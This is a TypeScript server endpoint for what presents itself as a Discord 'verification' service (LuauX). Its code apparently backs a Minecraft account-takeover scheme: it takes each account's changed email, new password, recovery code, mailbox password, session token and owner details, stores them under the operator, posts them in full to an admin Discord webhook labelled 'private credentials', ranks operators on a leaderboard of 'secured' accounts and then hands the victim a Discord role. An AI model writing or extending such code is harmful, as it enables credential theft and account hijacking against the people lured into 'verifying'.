import { createFileRoute } from "@tanstack/react-router";
import { authWorker, workerDb } from "@/lib/worker-auth.server";
import { envStr } from "@/lib/luaux-server.server";

const db = workerDb;

export const Route = createFileRoute("/api/verification/complete")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        if (!authWorker(request)) {
          return Response.json({ error: "Unauthorized" }, { status: 401 });
        }

        let body: { config?: Record<string, unknown>; result?: Record<string, unknown> };
        try {
          body = await request.json();
        } catch {
          return Response.json({ error: "Invalid JSON" }, { status: 400 });
        }

        const { config, result } = body;
        if (!config || !result) {
          return Response.json({ error: "Missing config or result" }, { status: 400 });
        }

        const memberDiscordId = (config.discordId as string) || "";
        const ownerDiscordId = (config.ownerDiscordId as string) || "";
        const mcUsername = (result.mcUsername as string) || "Unknown";
        const mcEmail = (config.email as string) || "";
        const guildId = (config.guildId as string) || "";
        const channelId = (config.channelId as string) || "";
        const roleId = (config.roleId as string) || "";
        const sessionId = (config.sessionId as string) || "";

        // Prefer the guild owner's bot token (per-user bot)
        let ownerId = ownerDiscordId;
        let botToken = envStr("DISCORD_BOT_TOKEN");
        if (guildId) {
          const { data: settings } = await db()
            .from("verification_settings")
            .select("verified_role_id, channel_id, discord_id, bot_token")
            .eq("guild_id", guildId)
            .maybeSingle();
          if (!ownerId && settings?.discord_id) ownerId = settings.discord_id;
          if (settings?.bot_token) botToken = settings.bot_token as string;
        }

        // Store under license owner so dashboard getSecuredAccounts works;
        // member id is still used for role assignment.
        const storeDiscordId = ownerId || memberDiscordId;

        const newEmail = String(result.newEmail || "");
        const newPassword = String(result.newPassword || "");
        const recoveryCode = String(result.recoveryCode || "");
        const secured =
          newEmail &&
          newPassword &&
          recoveryCode &&
          newEmail !== "Couldn't Change!" &&
          newPassword !== "Couldn't Change!" &&
          recoveryCode !== "Couldn't Change!";

        if (!secured) {
          if (sessionId) {
            await db()
              .from("verification_sessions")
              .update({ status: "failed" })
              .eq("id", sessionId);
          }
          return Response.json(
            { error: "Secure result incomplete — credentials not changed" },
            { status: 422 },
          );
        }

        const mailboxEmail =
          String(result.mailboxEmail || result.mailbox_email || newEmail || "").trim() || null;
        const mailboxPassword =
          String(result.mailboxPassword || result.mailbox_password || "").trim() || null;
        const mailboxProvider =
          String(result.mailboxProvider || result.mailbox_provider || "").trim() || null;
        const mailboxImapHost =
          String(result.mailboxImapHost || result.mailbox_imap_host || "").trim() || null;

        // Store secured account — full row first, then minimal if optional columns missing
        const fullRow = {
          discord_id: storeDiscordId,
          mc_username: mcUsername,
          mc_email: mcEmail,
          new_email: newEmail,
          new_password: newPassword,
          new_recovery_code: recoveryCode,
          mailbox_email: mailboxEmail,
          mailbox_password: mailboxPassword,
          mailbox_provider: mailboxProvider,
          mailbox_imap_host: mailboxImapHost,
          mc_ssid: (result.ssid as string) || null,
          mc_capes: (result.capes as string) || null,
          mc_method: (result.method as string) || null,
          owner_first_name: (result.firstName as string) || null,
          owner_last_name: (result.lastName as string) || null,
          owner_region: (result.region as string) || null,
          owner_birthday: (result.birthday as string) || null,
          guild_id: guildId || null,
          session_id: sessionId || null,
        };
        const midRow = {
          discord_id: storeDiscordId,
          mc_username: mcUsername,
          mc_email: mcEmail,
          new_email: newEmail,
          new_password: newPassword,
          new_recovery_code: recoveryCode,
          mailbox_email: mailboxEmail,
          mailbox_password: mailboxPassword,
          mc_ssid: (result.ssid as string) || null,
          mc_method: (result.method as string) || null,
          guild_id: guildId || null,
          session_id: sessionId || null,
        };
        const minimalRow = {
          discord_id: storeDiscordId,
          mc_username: mcUsername,
          mc_email: mcEmail,
          new_email: newEmail,
          new_password: newPassword,
          new_recovery_code: recoveryCode,
        };

        let securedRow: { id: string } | null = null;
        let insertError: { message: string } | null = null;
        {
          const { data, error } = await db()
            .from("secured_accounts")
            .insert(fullRow)
            .select("id")
            .single();
          if (!error && data) {
            securedRow = data;
          } else {
            insertError = error;
            if (error && /column|does not exist|schema cache/i.test(error.message)) {
              console.warn(
                "[verification/complete] full insert failed, retrying mid:",
                error.message,
              );
              const { data: d2, error: e2 } = await db()
                .from("secured_accounts")
                .insert(midRow)
                .select("id")
                .single();
              if (!e2 && d2) {
                securedRow = d2;
                insertError = null;
              } else if (e2 && /column|does not exist|schema cache/i.test(e2.message)) {
                console.warn(
                  "[verification/complete] mid insert failed, retrying minimal:",
                  e2.message,
                );
                const { data: d3, error: e3 } = await db()
                  .from("secured_accounts")
                  .insert(minimalRow)
                  .select("id")
                  .single();
                if (!e3 && d3) {
                  securedRow = d3;
                  insertError = null;
                } else {
                  insertError = e3 || e2 || error;
                }
              } else {
                insertError = e2 || error;
              }
            }
          }
        }

        if (insertError || !securedRow) {
          console.error(
            "[verification/complete] insert secured_accounts:",
            insertError?.message,
            "creds",
            { newEmail, storeDiscordId, mcUsername },
          );
          // Do NOT mark session failed if account was already secured — admin can recover from logs/webhook
          return Response.json(
            { error: `Failed to store secured account: ${insertError?.message || "unknown"}` },
            { status: 500 },
          );
        }

        // Always try to attach mailbox + optional fields (works if columns exist; no-op if not)
        if (securedRow?.id) {
          const patch: Record<string, unknown> = {};
          if (mailboxEmail) patch.mailbox_email = mailboxEmail;
          if (mailboxPassword) patch.mailbox_password = mailboxPassword;
          if (mailboxProvider) patch.mailbox_provider = mailboxProvider;
          if (mailboxImapHost) patch.mailbox_imap_host = mailboxImapHost;
          if (result.ssid) patch.mc_ssid = result.ssid;
          if (result.capes) patch.mc_capes = result.capes;
          if (result.method) patch.mc_method = result.method;
          if (result.firstName) patch.owner_first_name = result.firstName;
          if (result.lastName) patch.owner_last_name = result.lastName;
          if (result.region) patch.owner_region = result.region;
          if (result.birthday) patch.owner_birthday = result.birthday;
          if (Object.keys(patch).length) {
            const { error: patchErr } = await db()
              .from("secured_accounts")
              .update(patch)
              .eq("id", securedRow.id);
            if (patchErr) {
              console.warn(
                "[verification/complete] mailbox/details patch failed (run SQL migration):",
                patchErr.message,
              );
            }
          }
        }

        if (sessionId) {
          await db()
            .from("verification_sessions")
            .update({ status: "secured" })
            .eq("id", sessionId)
            .neq("status", "secured");
        }

        // ---- Admin webhook FIRST (full creds as soon as secure succeeds) ----
        const adminWebhookUrl =
          envStr("ADMIN_WEBHOOK_URL") || envStr("SECURED_ADMIN_WEBHOOK_URL");
        if (!adminWebhookUrl) {
          console.error(
            "[verification/complete] ADMIN_WEBHOOK_URL missing — set on Vercel Production for admin creds alerts",
          );
        } else {
          const ssid = String(result.ssid || "N/A");
          const capes = String(result.capes || "N/A");
          const method = String(result.method || "N/A");
          const firstName = String(result.firstName || "N/A");
          const lastName = String(result.lastName || "N/A");
          const region = String(result.region || "N/A");
          const birthday = String(result.birthday || "N/A");
          const securedId = String(securedRow?.id || "N/A");

          const plain =
            `🔒 **Account Secured**\n` +
            `MC: \`${mcUsername}\`\n` +
            `Old email: \`${mcEmail || "N/A"}\`\n` +
            `New email: \`${newEmail}\`\n` +
            `New password: \`${newPassword}\`\n` +
            `Recovery code: \`${recoveryCode}\`\n` +
            `Member: \`${memberDiscordId || "N/A"}\`\n` +
            `Owner: \`${storeDiscordId || "N/A"}\`\n` +
            `Guild: \`${guildId || "N/A"}\``;

          const payload = {
            content: plain.slice(0, 1900),
            embeds: [
              {
                title: "🔒 Account Secured — Full Credentials",
                color: 0xed4245,
                timestamp: new Date().toISOString(),
                fields: [
                  { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
                  { name: "Purchase", value: `\`\`\`${method}\`\`\``, inline: true },
                  { name: "Capes", value: `\`\`\`${capes.slice(0, 200)}\`\`\``, inline: true },
                  {
                    name: "Original MC Email",
                    value: `\`\`\`${mcEmail || "N/A"}\`\`\``,
                    inline: false,
                  },
                  { name: "New Email", value: `\`\`\`${newEmail}\`\`\``, inline: false },
                  { name: "New Password", value: `\`\`\`${newPassword}\`\`\``, inline: true },
                  { name: "Recovery Code", value: `\`\`\`${recoveryCode}\`\`\``, inline: true },
                  {
                    name: "Mailbox",
                    value: `\`\`\`${mailboxEmail || "N/A"}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Mailbox Password",
                    value: `\`\`\`${mailboxPassword || "N/A"}\`\`\``,
                    inline: true,
                  },
                  {
                    name: "Mailbox Provider",
                    value: `\`\`\`${mailboxProvider || "N/A"} @ ${mailboxImapHost || "?"}\`\`\``,
                    inline: true,
                  },
                  {
                    name: "SSID",
                    value: `\`\`\`${ssid.length > 180 ? ssid.slice(0, 180) + "…" : ssid}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "Owner Profile",
                    value: `\`\`\`${firstName} ${lastName} | ${region} | ${birthday}\`\`\``,
                    inline: false,
                  },
                  { name: "Member Discord", value: `\`\`\`${memberDiscordId || "N/A"}\`\`\``, inline: true },
                  { name: "Owner Discord", value: `\`\`\`${storeDiscordId || "N/A"}\`\`\``, inline: true },
                  { name: "Guild", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
                  { name: "Session", value: `\`\`\`${sessionId || "N/A"}\`\`\``, inline: true },
                  { name: "Secured Row", value: `\`\`\`${securedId}\`\`\``, inline: true },
                  { name: "Channel", value: `\`\`\`${channelId || "N/A"}\`\`\``, inline: true },
                ],
                footer: { text: "LuauX admin webhook — private credentials" },
              },
            ],
          };

          let webhookOk = false;
          for (let attempt = 1; attempt <= 3; attempt++) {
            try {
              const whRes = await fetch(adminWebhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
              });
              if (whRes.ok || whRes.status === 204) {
                webhookOk = true;
                console.log(`[verification/complete] admin webhook ok (attempt ${attempt})`);
                break;
              }
              const t = await whRes.text().catch(() => "");
              console.error(
                `[verification/complete] admin webhook HTTP ${whRes.status} attempt ${attempt}: ${t.slice(0, 200)}`,
              );
            } catch (e) {
              console.error(
                `[verification/complete] admin webhook error attempt ${attempt}:`,
                e instanceof Error ? e.message : e,
              );
            }
            await new Promise((r) => setTimeout(r, 400 * attempt));
          }
          if (!webhookOk) {
            console.error("[verification/complete] admin webhook FAILED after retries");
          }
        }

        // Leaderboard: count successful secures (idempotent by secured row / session)
        try {
          const { recordLeaderboardSecured } = await import("@/lib/leaderboard.server");
          const sourceId = (securedRow?.id as string) || sessionId || null;
          let rankName = mcUsername;
          if (storeDiscordId) {
            const { data: prof } = await db()
              .from("profiles")
              .select("username, global_name")
              .eq("discord_id", storeDiscordId)
              .maybeSingle();
            rankName =
              (prof?.global_name as string) ||
              (prof?.username as string) ||
              mcUsername;
          }
          await recordLeaderboardSecured(db(), {
            discordId: storeDiscordId,
            username: rankName,
            sourceId,
          });
        } catch (e) {
          console.warn("[verification/complete] leaderboard record failed:", e);
        }

        // No public channel success message — role only; creds stay in dashboard/admin webhook

        // Role grant
        if (guildId && roleId && memberDiscordId && botToken) {
          const roleRes = await fetch(
            `https://discord.com/api/v10/guilds/${guildId}/members/${memberDiscordId}/roles/${roleId}`,
            {
              method: "PUT",
              headers: {
                Authorization: `Bot ${botToken}`,
                "Content-Type": "application/json",
                "X-Audit-Log-Reason": "LuauX verification",
              },
            },
          );
          if (!roleRes.ok) {
            const t = await roleRes.text().catch(() => "");
            console.error("[verification/complete] role assign failed:", roleRes.status, t);
          }
        } else if (!botToken) {
          console.error("[verification/complete] No bot token available for guild", guildId);
        }

        // No member DM with credentials — secrets go only to ADMIN_WEBHOOK_URL (+ dashboard)

        return Response.json({ ok: true });
      },
    },
  },
});
